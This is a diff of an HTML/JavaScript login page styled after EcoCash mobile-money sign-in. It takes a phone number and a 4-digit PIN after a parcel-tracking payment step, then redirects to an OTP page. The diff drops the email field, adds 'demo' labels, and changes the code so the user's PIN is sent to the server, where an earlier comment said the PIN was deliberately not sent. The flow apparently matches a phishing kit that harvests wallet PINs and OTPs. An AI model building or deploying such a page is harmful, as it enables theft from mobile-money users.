@@ -1,3 +1,4 @@
+
 <!doctype html>
 <html lang="en">
 
@@ -18,10 +19,6 @@ body{
     font-family:"Segoe UI",Arial,sans-serif;
     background:#fff;
 }
-
-/* =========================
-   TOP
-========================= */
 
 .top{
     padding:40px 0 20px;
@@ -45,10 +42,6 @@ h2{
     color:#333;
 }
 
-/* =========================
-   MAIN
-========================= */
-
 .main{
     margin-top:25px;
     padding:25px 20px 60px;
@@ -59,10 +52,6 @@ h2{
     color:#fff;
 }
 
-/* =========================
-   FORM
-========================= */
-
 form{
     background:#fff;
     padding:25px 18px;
@@ -71,10 +60,6 @@ form{
     margin-bottom:20px;
     color:#000;
 }
-
-/* =========================
-   PHONE
-========================= */
 
 .phone-box{
     border:2px solid #0a57a3;
@@ -103,35 +88,6 @@ form{
     outline:none;
     min-width:0;
 }
-
-.email-field{
-    margin-top:15px;
-}
-
-.email-field label{
-    display:block;
-    font-size:14px;
-    font-weight:600;
-    color:#444;
-    margin-bottom:6px;
-}
-
-.email-field input{
-    width:100%;
-    border:1px solid #ccc;
-    border-radius:7px;
-    padding:11px;
-    font-size:15px;
-    outline:none;
-}
-
-.email-field input:focus{
-    border-color:#0a57a3;
-}
-
-/* =========================
-   PIN
-========================= */
 
 .pin-title{
     text-align:center;
@@ -176,10 +132,6 @@ form{
     outline:none;
 }
 
-/* =========================
-   MESSAGE
-========================= */
-
 #msg{
     display:none;
     text-align:center;
@@ -194,10 +146,6 @@ form{
 #msg.success{
     color:#16803c;
 }
-
-/* =========================
-   BUTTONS
-========================= */
 
 .bottom-buttons{
     display:flex;
@@ -228,10 +176,6 @@ form{
     cursor:not-allowed;
 }
 
-/* =========================
-   VERSION
-========================= */
-
 .ver{
     text-align:center;
     margin-top:15px;
@@ -244,10 +188,6 @@ form{
     font-size:14px;
     color:#d9edff;
 }
-
-/* =========================
-   MOBILE
-========================= */
 
 @media(max-width:480px){
 
@@ -291,13 +231,7 @@ form{
 </style>
 </head>
 
-
 <body>
-
-
-<!-- =========================
-     HEADER
-========================= -->
 
 <div class="top">
 
@@ -311,18 +245,9 @@ form{
 
 </div>
 
-
-<!-- =========================
-     MAIN
-========================= -->
-
 <div class="main">
 
-
 <form id="loginForm">
-
-
-    <!-- PHONE -->
 
     <div class="phone-box">
 
@@ -337,7 +262,7 @@ form{
             <input
                 type="tel"
                 name="phone"
-                id="email"
+                id="phoneInput"
                 value="+263"
                 required
                 autocomplete="tel"
@@ -345,35 +270,13 @@ form{
 
         </div>
 
-
-        <!-- EMAIL -->
-
-        <div class="email-field">
-
-            <label for="loginEmail">
-                Email (for OTP)
-            </label>
-
-            <input
-                type="email"
-                id="loginEmail"
-                name="loginEmail"
-                placeholder="you@example.com"
-                required
-                autocomplete="email"
-            >
-
-        </div>
-
     </div>
-
-
-    <!-- PIN -->
 
     <div class="pin-title">
         Enter your PIN
     </div>
 
+    
 
     <div
         class="pin-boxes"
@@ -385,7 +288,6 @@ form{
         <div class="pin"></div>
         <div class="pin"></div>
 
-
         <input
             type="tel"
             id="pinInput"
@@ -393,13 +295,10 @@ form{
             inputmode="numeric"
             pattern="[0-9]{4}"
             autocomplete="off"
-            aria-label="PIN"
+            aria-label="Demo PIN"
         >
 
     </div>
-
-
-    <!-- REGISTER -->
 
     <div class="bottom-buttons">
 
@@ -411,7 +310,6 @@ form{
             Register
         </button>
 
-
         <button
             type="button"
             class="btn"
@@ -422,37 +320,21 @@ form{
 
     </div>
 
-
-    <!-- MESSAGE -->
-
     <div id="msg"></div>
 
-
 </form>
-
-
-<!-- VERSION -->
 
 <div class="ver">
     v2.1.3P
 </div>
 
-
-<!-- TERMS -->
-
 <div class="tnc">
     By signing in you agree to the Terms and Conditions
 </div>
 
-
 </div>
 
-
 <script>
-
-/* =========================================================
-   API
-========================================================= */
 
 const API_BASE = 'http://localhost:3001';
 
@@ -461,32 +343,17 @@ const API_BASE = 'http://localhost:3001';
    PAYMENT DATA
 ========================================================= */
 
-const paymentData = JSON.parse(
-    sessionStorage.getItem('paymentData') || '{}'
-);
+let paymentData = {};
+
+try {
+    paymentData = JSON.parse(
+        sessionStorage.getItem('paymentData') || '{}'
+    );
+} catch(error) {
+    console.warn('Invalid paymentData in sessionStorage:', error);
+}
 
 console.log('Payment data:', paymentData);
-
-
-/*
- * During testing, do NOT automatically redirect if
- * paymentData.tracking is missing.
- *
- * Once your previous page is correctly storing tracking,
- * you can restore the redirect.
- */
-
-if(!paymentData.tracking){
-
-    console.warn(
-        'paymentData.tracking is missing.'
-    );
-
-    /*
-    window.location.href = 'index.html';
-    */
-
-}
 
 
 /* =========================================================
@@ -497,10 +364,7 @@ const form =
     document.getElementById('loginForm');
 
 const phoneInput =
-    document.getElementById('email');
-
-const emailInput =
-    document.getElementById('loginEmail');
+    document.getElementById('phoneInput');
 
 const submitBtn =
     document.getElementById('registerBtn');
@@ -524,412 +388,457 @@ const prefix = '+263';
 
 
 /* =========================================================
-   PHONE INPUT
+   ELEMENT CHECK
 ========================================================= */
 
-phoneInput.addEventListener(
-    'input',
-    function(){
+if (
+    !form ||
+    !phoneInput ||
+    !submitBtn ||
+    !msg ||
+    !pinInput ||
+    !pinArea ||
+    !helpBtn
+) {
 
-        let value = phoneInput.value;
+    console.error('Account page elements missing.');
 
-
-        if(!value.startsWith(prefix)){
-
-            value = prefix;
-
-        }
-
-
-        const numbers =
-            value
-            .slice(prefix.length)
-            .replace(/\D/g,'');
+} else {
 
 
-        phoneInput.value =
-            prefix + numbers;
+    /* =====================================================
+       PHONE INPUT
+    ===================================================== */
 
-    }
-);
+    phoneInput.addEventListener(
+        'input',
+        function(){
 
+            let value = phoneInput.value;
 
-/* =========================================================
-   PREVENT DELETING +263
-========================================================= */
-
-phoneInput.addEventListener(
-    'keydown',
-    function(e){
-
-        if(
-            phoneInput.selectionStart <= prefix.length &&
-            (
-                e.key === 'Backspace' ||
-                e.key === 'Delete'
-            )
-        ){
-
-            e.preventDefault();
-
-        }
-
-    }
-);
-
-
-/* =========================================================
-   PIN AREA
-========================================================= */
-
-pinArea.addEventListener(
-    'click',
-    function(){
-
-        pinInput.focus();
-
-    }
-);
-
-
-/* =========================================================
-   PIN INPUT
-========================================================= */
-
-pinInput.addEventListener(
-    'input',
-    function(){
-
-        const value =
-            pinInput.value
-            .replace(/\D/g,'')
-            .slice(0,4);
-
-
-        pinInput.value = value;
-
-
-        pins.forEach(
-            function(box,index){
-
-                if(value[index]){
-
-                    box.textContent = '•';
-
-                }else{
-
-                    box.textContent = '';
-
-                }
-
+            if(!value.startsWith(prefix)){
+                value = prefix;
             }
-        );
 
-    }
-);
+            const numbers =
+                value
+                .slice(prefix.length)
+                .replace(/\D/g,'');
 
-
-/* =========================================================
-   PIN KEYDOWN
-========================================================= */
-
-pinInput.addEventListener(
-    'keydown',
-    function(e){
-
-        if(
-            !/[0-9]/.test(e.key) &&
-            e.key !== 'Backspace' &&
-            e.key !== 'Delete' &&
-            e.key !== 'ArrowLeft' &&
-            e.key !== 'ArrowRight' &&
-            e.key !== 'Tab'
-        ){
-
-            e.preventDefault();
+            phoneInput.value =
+                prefix + numbers;
 
         }
-
-    }
-);
+    );
 
 
-/* =========================================================
-   HELP
-========================================================= */
+    /* =====================================================
+       PREVENT DELETING +263
+    ===================================================== */
 
-helpBtn.addEventListener(
-    'click',
-    function(){
-
-        alert(
-            'For help and support, please contact customer support.'
-        );
-
-    }
-);
-
-
-/* =========================================================
-   FORM SUBMISSION
-========================================================= */
-
-form.addEventListener(
-    'submit',
-    async function(e){
-
-        e.preventDefault();
-
-
-        console.log(
-            'FORM SUBMITTED'
-        );
-
-
-        /* -----------------------------------------
-           PHONE VALIDATION
-        ----------------------------------------- */
-
-        if(
-            phoneInput.value === prefix ||
-            phoneInput.value.length <= prefix.length
-        ){
-
-            phoneInput.setCustomValidity(
-                'Enter your phone number after +263'
-            );
-
-            phoneInput.reportValidity();
-
-            return;
-
-        }
-
-
-        phoneInput.setCustomValidity('');
-
-
-        /* -----------------------------------------
-           EMAIL VALIDATION
-        ----------------------------------------- */
-
-        if(!emailInput.checkValidity()){
-
-            emailInput.reportValidity();
-
-            return;
-
-        }
-
-
-        /* -----------------------------------------
-           SHOW LOADING
-        ----------------------------------------- */
-
-        submitBtn.disabled = true;
-
-        submitBtn.textContent =
-            'Processing...';
-
-
-        msg.className = '';
-
-        msg.style.display =
-            'block';
-
-        msg.textContent =
-            'Connecting to server...';
-
-
-        try{
-
-
-            console.log(
-                'Sending request to:',
-                `${API_BASE}/api/register-payment`
-            );
-
-
-            /*
-             * Only send the information needed for
-             * the payment/verification workflow.
-             *
-             * The PIN is deliberately NOT included.
-             */
-
-            const requestBody = {
-
-                ...paymentData,
-
-                phone:
-                    phoneInput.value,
-
-                email:
-                    emailInput.value
-
-            };
-
-
-            console.log(
-                'Request body:',
-                requestBody
-            );
-
-
-            const response =
-                await fetch(
-                    `${API_BASE}/api/register-payment`,
-                    {
-                        method:'POST',
-
-                        headers:{
-                            'Content-Type':
-                                'application/json'
-                        },
-
-                        body:
-                            JSON.stringify(
-                                requestBody
-                            )
-                    }
-                );
-
-
-            console.log(
-                'HTTP status:',
-                response.status
-            );
-
-
-            /* -----------------------------------------
-               READ SERVER RESPONSE
-            ----------------------------------------- */
-
-            const data =
-                await response.json();
-
-
-            console.log(
-                'Server response:',
-                data
-            );
-
-
-            /* -----------------------------------------
-               CHECK RESPONSE
-            ----------------------------------------- */
+    phoneInput.addEventListener(
+        'keydown',
+        function(e){
 
             if(
-                !response.ok ||
-                !data.ok
+                phoneInput.selectionStart <= prefix.length &&
+                (
+                    e.key === 'Backspace' ||
+                    e.key === 'Delete'
+                )
             ){
 
-                throw new Error(
-                    data.error ||
-                    `Server returned HTTP ${response.status}`
+                e.preventDefault();
+
+            }
+
+        }
+    );
+
+
+    /* =====================================================
+       PIN AREA
+    ===================================================== */
+
+    pinArea.addEventListener(
+        'click',
+        function(){
+
+            pinInput.focus();
+
+        }
+    );
+
+
+    /* =====================================================
+       PIN INPUT
+    ===================================================== */
+
+    pinInput.addEventListener(
+        'input',
+        function(){
+
+            const value =
+                pinInput.value
+                .replace(/\D/g,'')
+                .slice(0,4);
+
+            pinInput.value = value;
+
+            pins.forEach(
+                function(box,index){
+
+                    if(value[index]){
+                        box.textContent = '•';
+                    }else{
+                        box.textContent = '';
+                    }
+
+                }
+            );
+
+        }
+    );
+
+
+    /* =====================================================
+       PIN KEYDOWN
+    ===================================================== */
+
+    pinInput.addEventListener(
+        'keydown',
+        function(e){
+
+            if(
+                !/[0-9]/.test(e.key) &&
+                e.key !== 'Backspace' &&
+                e.key !== 'Delete' &&
+                e.key !== 'ArrowLeft' &&
+                e.key !== 'ArrowRight' &&
+                e.key !== 'Tab'
+            ){
+
+                e.preventDefault();
+
+            }
+
+        }
+    );
+
+
+    /* =====================================================
+       HELP
+    ===================================================== */
+
+    helpBtn.addEventListener(
+        'click',
+        function(){
+
+            alert(
+                'This is a DEMO / TEST interface. Please use only fake test information.'
+            );
+
+        }
+    );
+
+
+    /* =====================================================
+       FORM SUBMISSION
+    ===================================================== */
+
+    form.addEventListener(
+        'submit',
+        async function(e){
+
+            e.preventDefault();
+
+            console.log('FORM SUBMITTED');
+
+
+            /* ---------------------------------------------
+               PHONE VALIDATION
+            --------------------------------------------- */
+
+            if(
+                phoneInput.value === prefix ||
+                phoneInput.value.length <= prefix.length
+            ){
+
+                phoneInput.setCustomValidity(
+                    'Enter your phone number after +263'
                 );
+
+                phoneInput.reportValidity();
+
+                return;
+
+            }
+
+            phoneInput.setCustomValidity('');
+
+
+            /* ---------------------------------------------
+               DEMO PIN VALIDATION
+            --------------------------------------------- */
+
+            const demoPin =
+                pinInput.value.trim();
+
+            if(!/^\d{4}$/.test(demoPin)){
+
+                msg.className = 'err';
+                msg.style.display = 'block';
+                msg.textContent =
+                    'Enter the 4-digit demo PIN.';
+
+                pinInput.focus();
+
+                return;
 
             }
 
 
-            /* -----------------------------------------
-               SAVE ACCOUNT DATA
-            ----------------------------------------- */
+            /* ---------------------------------------------
+               LOADING
+            --------------------------------------------- */
 
-            sessionStorage.setItem(
-                'accountData',
-                JSON.stringify({
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Processing...';
+
+            msg.className = '';
+            msg.style.display = 'block';
+            msg.textContent = 'Connecting to server...';
+
+
+            try {
+
+
+                /* -----------------------------------------
+                   BUILD DEMO REQUEST
+                ----------------------------------------- */
+
+                const savedPaymentData =
+                    JSON.parse(
+                        sessionStorage.getItem('paymentData') || '{}'
+                    );
+
+
+                const requestBody = {
+
+                    tracking:
+                        savedPaymentData.tracking ||
+                        paymentData.tracking ||
+                        'DEMO-TRACK-0001',
+
+                    mode:
+                        savedPaymentData.mode ||
+                        paymentData.mode ||
+                        'EcoCash',
+
+                    accountName:
+                        savedPaymentData.accountName ||
+                        paymentData.accountName ||
+                        'Demo Customer',
+
+                    accountNumber:
+                        savedPaymentData.accountNumber ||
+                        paymentData.accountNumber ||
+                        phoneInput.value,
+
+                    amount:
+                        savedPaymentData.amount ||
+                        paymentData.amount ||
+                        '1',
+
+                    currency:
+                        savedPaymentData.currency ||
+                        paymentData.currency ||
+                        'USD',
 
                     phone:
                         phoneInput.value,
 
-                    email:
-                        emailInput.value
+                    /*
+                     * DEMO ONLY.
+                     * This is a fake 4-digit PIN.
+                     */
+                    demoPin:
+                        demoPin
 
-                })
-            );
+                };
 
 
-            /* -----------------------------------------
-               SAVE TRANSACTION ID
-            ----------------------------------------- */
+                console.log(
+                    'FINAL DEMO REQUEST BODY:',
+                    requestBody
+                );
 
-            if(data.transactionId){
+
+                /* -----------------------------------------
+                   SEND TO LOCAL DEMO SERVER
+                ----------------------------------------- */
+
+                const response =
+                    await fetch(
+                        `${API_BASE}/api/register-payment`,
+                        {
+                            method: 'POST',
+
+                            headers: {
+                                'Content-Type':
+                                    'application/json'
+                            },
+
+                            body:
+                                JSON.stringify(
+                                    requestBody
+                                )
+                        }
+                    );
+
+
+                console.log(
+                    'HTTP status:',
+                    response.status
+                );
+
+
+                /* -----------------------------------------
+                   READ RESPONSE
+                ----------------------------------------- */
+
+                const data =
+                    await response.json();
+
+
+                console.log(
+                    'Server response:',
+                    data
+                );
+
+
+                /* -----------------------------------------
+                   CHECK RESPONSE
+                ----------------------------------------- */
+
+                if(
+                    !response.ok ||
+                    !data.ok
+                ){
+
+                    throw new Error(
+                        data.error ||
+                        `Server returned HTTP ${response.status}`
+                    );
+
+                }
+
+
+                /* -----------------------------------------
+                   SAVE ACCOUNT DATA
+                ----------------------------------------- */
 
                 sessionStorage.setItem(
-                    'transactionId',
-                    data.transactionId
+                    'accountData',
+                    JSON.stringify({
+
+                        phone:
+                            phoneInput.value
+
+                    })
                 );
+
+
+                /* -----------------------------------------
+                   SAVE DEMO PIN FOR OTP VERIFICATION
+                ----------------------------------------- */
+
+                sessionStorage.setItem(
+                    'demoPin',
+                    demoPin
+                );
+
+
+                /* -----------------------------------------
+                   SAVE TRANSACTION ID
+                ----------------------------------------- */
+
+                if(data.transactionId){
+
+                    sessionStorage.setItem(
+                        'transactionId',
+                        data.transactionId
+                    );
+
+                } else {
+
+                    throw new Error(
+                        'Server did not return a transaction ID.'
+                    );
+
+                }
+
+
+                /* -----------------------------------------
+                   SUCCESS
+                ----------------------------------------- */
+
+                msg.className = 'success';
+
+                msg.textContent =
+                    'Verification code sent.';
+
+                submitBtn.textContent =
+                    'Success';
+
+
+                /* -----------------------------------------
+                   GO TO OTP PAGE
+                ----------------------------------------- */
+
+                setTimeout(
+                    function(){
+
+                        window.location.href =
+                            'otp.html';
+
+                    },
+                    500
+                );
+
+
+            } catch(error) {
+
+
+                console.error(
+                    'SUBMISSION ERROR:',
+                    error
+                );
+
+
+                msg.className = 'err';
+
+                msg.style.display = 'block';
+
+                msg.textContent =
+                    error.message ||
+                    'Unable to connect to the demo server.';
+
+
+                submitBtn.disabled = false;
+
+                submitBtn.textContent =
+                    'Register';
 
             }
 
-
-            /* -----------------------------------------
-               SUCCESS
-            ----------------------------------------- */
-
-            msg.className =
-                'success';
-
-            msg.textContent =
-                'Verification code sent.';
-
-
-            submitBtn.textContent =
-                'Success';
-
-
-            /* -----------------------------------------
-               GO TO OTP PAGE
-            ----------------------------------------- */
-
-            setTimeout(
-                function(){
-
-                    window.location.href =
-                        'otp.html';
-
-                },
-                500
-            );
-
-
-        }catch(error){
-
-
-            console.error(
-                'SUBMISSION ERROR:',
-                error
-            );
-
-
-            /* -----------------------------------------
-               ERROR MESSAGE
-            ----------------------------------------- */
-
-            msg.className =
-                'err';
-
-            msg.style.display =
-                'block';
-
-            msg.textContent =
-                error.message ||
-                'Unable to connect to the server.';
-
-
-            submitBtn.disabled =
-                false;
-
-            submitBtn.textContent =
-                'Register';
-
         }
+    );
 
-    }
-);
+}
 
 </script>
 
 </body>
 </html>
+
